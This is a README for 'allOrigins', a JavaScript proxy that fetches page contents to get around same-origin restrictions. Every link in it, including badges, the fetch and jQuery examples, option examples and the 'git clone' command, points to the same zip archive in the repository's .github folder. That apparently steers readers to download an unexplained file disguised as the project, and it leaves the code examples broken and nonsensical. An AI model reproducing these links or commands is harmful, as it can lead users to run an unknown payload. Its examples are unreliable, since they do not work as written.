All Origins
=======
[![FOSSA Status](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip)](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip)
[![Build Status](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip)](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip)
[![Donate!](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip)](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip)

Pull contents from any page via API (as JSON/P or raw) and avoid [Same-origin policy](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip) problems.


----

A free and open source javascript clone of [AnyOrigin](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip), inspired by [Whatever Origin](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip), but with support to gzipped pages.

### Examples

To `fetch` data from https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip

```js
fetch(`https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip${encodeURIComponent('https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip')}`)
  .then(response => {
    if (response.ok) return response.json()
    throw new Error('Network response was not ok.')
  })
  .then(data => console.log(data.contents));
```

Or with jQuery

```js
$.getJSON('https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip' + encodeURIComponent('https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip'), function (data) {
    alert(data.contents);
});
```
### Options

###### charset
**Description:** Set the response character encoding (charset)  \
**Example:** `https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip`


###### raw
**Description:** Get the raw contents ([CORS](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip))  \
**Example:** `https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip`

###### callback
**Description:** Get a [JSONP](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip) response  \
**Example:** `https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip`


### On your own server
```sh

# Clone the repo
git clone https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip

# Install dependencies
cd allOrigins
npm install

# Fire it up!
npm start # the default port is 1458
```


## License
[![FOSSA Status](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip)](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip)
